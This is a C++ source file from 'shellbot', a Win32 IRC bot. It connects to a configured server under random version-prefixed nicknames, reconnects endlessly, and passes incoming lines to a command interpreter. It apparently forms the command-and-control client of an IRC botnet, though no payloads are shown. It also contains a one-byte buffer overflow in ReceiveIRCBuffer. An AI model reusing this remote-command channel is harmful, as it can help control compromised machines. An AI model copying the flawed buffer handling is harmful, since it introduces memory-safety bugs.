/*	shellbot - a high performance IRC bot for Win32
	Copyright (C) 2005 Shellz

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#include "vInclude.h"
#include "vPOEb.h"
#include "vExterns.h"
#pragma warning (disable:4786)
 
void *RunIRC(void)
{
	try{
		while(vPOEb->botRunning) {
			if (!vPOEb->vIRC.noReconnect) {
				if (vPOEb->vIRC.ConnectServer()) {
					vPOEb->DebugPrint("bot",con::fg_red,"connected to %s:%i",vPOEb->vIRC.cConf.vServer.c_str(), vPOEb->vIRC.cConf.vPort);
					vPOEb->vIRC.IRCRunning = true;						
					vPOEb->vIRC.cConf.vRealNick = vPOEb->vIRC.RndNick(USVersion());				
					vPOEb->vIRC.SendData("NICK %s\r\nUSER %s 0 0 :%s\r\n",vPOEb->vIRC.cConf.vRealNick.c_str(),vPOEb->vIRC.cConf.vRealNick.c_str(),vPOEb->vIRC.cConf.vRealNick.c_str());		
					vPOEb->vMain.sTopic = false;
					vPOEb->vMain.sLogin = false;
				} else {
					vPOEb->vIRC.IRCRunning = false;
				}
				while(1) {
					if (!vPOEb->vIRC.ReceiveIRCBuffer() || !vPOEb->vIRC.IRCRunning || !vPOEb->botRunning) 
						break;
					
				}
#ifdef DEBUG_MODE
		vPOEb->DebugPrint("bot",con::fg_green,"Disconnecting from server...");
#endif
				vPOEb->vIRC.Disconnect("Disconnecting...");
				Sleep(5000);
				
			}
		}
	} catch (...) 
	//! Exception handling...very powerful :)
	{
#ifdef DEBUG_MODE
		vPOEb->DebugPrint("bot",con::fg_green,"Exception occurred.");
#endif
		vPOEb->vIRC.Disconnect("Exception occurred, reconnecting...");
		Sleep(2500);
	//	ExitProcess(0);
		return RunIRC();		
	}
	ExitThread(0);
	return NULL;
}

string CConnectIRC::RndNick(string vPrefix)
{
	string vRet;
	srand(GetTickCount());
	for(int i=0; i<6; i++) 
		vRet += char((rand()%26)+97);
	return vPrefix+vRet;
}

bool CConnectIRC::ConnectServer(void)
{
	SOCKADDR_IN vSin;
	vSin.sin_family = AF_INET;
	vSin.sin_port = htons(cConf.vPort);
	vSin.sin_addr.s_addr = ResolveAddress(cConf.vServer);

	vSocket = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
	if (vSocket == SOCKET_ERROR) {
#ifdef DEBUG_MODE
		vPOEb->DebugPrint("bot",con::fg_red,"create socket error");
#endif
		closesocket(vSocket);
		return false;
	}
	Sleep(100);
#ifdef DEBUG_MODE
	vPOEb->DebugPrint("bot",con::fg_red,"attempting to connect to server");
#endif
	if (connect(vSocket,(LPSOCKADDR)&vSin,sizeof(vSin)) == SOCKET_ERROR) {
		closesocket(vSocket);
#ifdef DEBUG_MODE
		vPOEb->DebugPrint("bot",con::fg_red,"connect socket error");
#endif
		return false;
	}

	return true;
}

bool CConnectIRC::ReceiveIRCBuffer(void) {
	const int vBufSize = 2;
	CCmd cCmd; FD_SET Reader; int readsocks;
	char vBuffer[vBufSize]; memset(vBuffer,0,vBufSize);
	string vBuf; string contents;
	char szEndOfBuff[1];
	string vBuffer2;
	while(1) {		
		int c = recv(vSocket, vBuffer, vBufSize-1, 0);
		if (c == SOCKET_ERROR || !c)
			return false;
		// \r\n
		sprintf(szEndOfBuff, "%c", vBuffer[0]);
		vBuffer2 += vBuffer;
		if (szEndOfBuff[0] == '\n') {
			break;
		}
	}
//	cout << vBuffer2 << endl;
//	vBuffer[c] = '\0';
#ifdef DEBUG_MODE
	OutputDebugString(vBuffer2.c_str());
#endif // DEBUG_MODE 
	contents = vBuffer2; vector <string> eBuffer;
	eBuffer = ParseIRCBuffer(contents, "\r\n");
	for (int k=0;k<eBuffer.size();k++) {
		vector <string> iBuffer; 
		iBuffer = ParseIRCBuffer(eBuffer[k], " ");
		if (iBuffer.size()>1) {
			cCmd.InterpretCmd(iBuffer);
#ifdef DEBUG_MODE
			vPOEb->DebugPrint("vIRC",con::fg_red,"%s",eBuffer[k].c_str());	
#endif // DEBUGMODE
		}		

	}
	return true;
/*	FD_SET fdSet_read; TIMEVAL timeout;
	
	FD_ZERO(&fdSet_read); FD_SET(vSocket, &fdSet_read);
	select(vSocket+1,&fdSet_read,NULL,NULL,NULL);

	if(FD_ISSET(vSocket, &fdSet_read)) {
		int c = recv(vSocket, vBuffer, vBufSize - 1, 0);
		if (c > 0) {
			contents = vBuffer; vector <string> eBuffer;
			eBuffer = ParseIRCBuffer(contents, "\r\n");
			for (int k=0;k<eBuffer.size();k++) {
				vector <string> iBuffer; 
				iBuffer = ParseIRCBuffer(eBuffer[k], " ");				
				if (iBuffer.size()>1) {
					cCmd.InterpretCmd(iBuffer);
#ifdef DEBUG_MODE
					vPOEb->DebugPrint("vIRC",con::fg_red,"%s",eBuffer[k].c_str());	
#endif // DEBUGMODE
				}		

			}
			return true;
		}
		return false;
	} else return false; */


}


vector <string> CConnectIRC::ParseIRCBuffer(string vBuffer, string type)
{
	vector <string> contents;
	int currentpos = -1;
	int prevpos = 0;
	int counter = 0;

	while (1)
	{
		currentpos = vBuffer.find(type, prevpos);
		if (currentpos == -1) break;
		contents.push_back(vBuffer.substr(prevpos, currentpos-prevpos));
		prevpos = currentpos+type.length();
	}
	contents.push_back(vBuffer.substr(prevpos, vBuffer.length()-prevpos-type.length()+1));
	return contents; 
}

bool CConnectIRC::SendData(const char *vBuffer,...)
{	
	va_list va_alist; char formatbuf[8192]; va_start(va_alist, vBuffer);
	_vsnprintf(formatbuf, sizeof(formatbuf), vBuffer, va_alist); va_end(va_alist);

	if (send(vSocket,formatbuf,strlen(formatbuf),0) == SOCKET_ERROR) {
		//Disconnect();
#ifdef DEBUG_MODE
		vPOEb->DebugPrint("bot",con::fg_red,"unable to send buffer");	
#endif // DEBUGMODE
		//vReply = true;
		return false;
	}	
	return true;
}

void CConnectIRC::Disconnect(char* szQuitMsg)
{
	if (IRCRunning)
		SendData("QUIT :%s\r\n", szQuitMsg);
	closesocket(vSocket);
	IRCRunning = false;
	bInitiated = false;
	vReply = false;
}

unsigned long CConnectIRC::ResolveAddress(string server)
{
	
	unsigned long IP = inet_addr(server.c_str());
	if (IP==INADDR_NONE) {
		hostent *pHE = gethostbyname(server.c_str());
		if (pHE == 0) 
			return INADDR_NONE;
		IP = *((unsigned long *)pHE->h_addr_list[0]);		
	}

	return IP;
}
